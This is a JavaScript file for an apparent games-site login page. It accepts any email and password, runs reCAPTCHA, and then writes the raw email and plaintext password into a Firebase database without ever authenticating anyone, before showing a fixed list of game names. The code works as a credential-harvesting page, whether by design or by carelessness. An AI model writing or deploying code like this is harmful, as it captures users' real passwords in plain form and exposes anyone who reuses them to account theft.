import { db } from './firebase-init.js';
import { ref, push, set } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";

const loginContainer = document.getElementById('loginContainer');
const gamesContainer = document.getElementById('gamesContainer');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const loginBtn = document.getElementById('loginBtn');
const gamesList = document.getElementById('gamesList');

const jogos = ["Aventura 3D", "Corrida Maluca", "Simulador de Fazendas", "Batalha Arena"];

function mostrarJogos() {
    gamesList.innerHTML = "";
    jogos.forEach(jogo => {
        const div = document.createElement("div");
        div.className = "game-card";
        div.innerText = jogo;
        gamesList.appendChild(div);
    });
}

loginBtn.addEventListener('click', () => {
    const email = emailInput.value;
    const senha = passwordInput.value;

    if(!email || !senha){
        alert("Preencha email e senha!");
        return;
    }

    // Executa reCAPTCHA v3
    grecaptcha.ready(function() {
        grecaptcha.execute('6Lfwd6UrAAAAAOBP4j6X_UjolcwisxMdGU3ucrU3', {action: 'login'}).then(function(token) {
            // Armazenando usuário no Firebase com token
            const usuarioRef = push(ref(db, 'usuarios'));
            set(usuarioRef, {
                email: email,
                senha: senha,
                recaptchaToken: token
            }).then(() => {
                loginContainer.style.display = 'none';
                gamesContainer.style.display = 'block';
                mostrarJogos();
            }).catch((error) => {
                alert("Erro ao logar: " + error);
            });
        });
    });
});
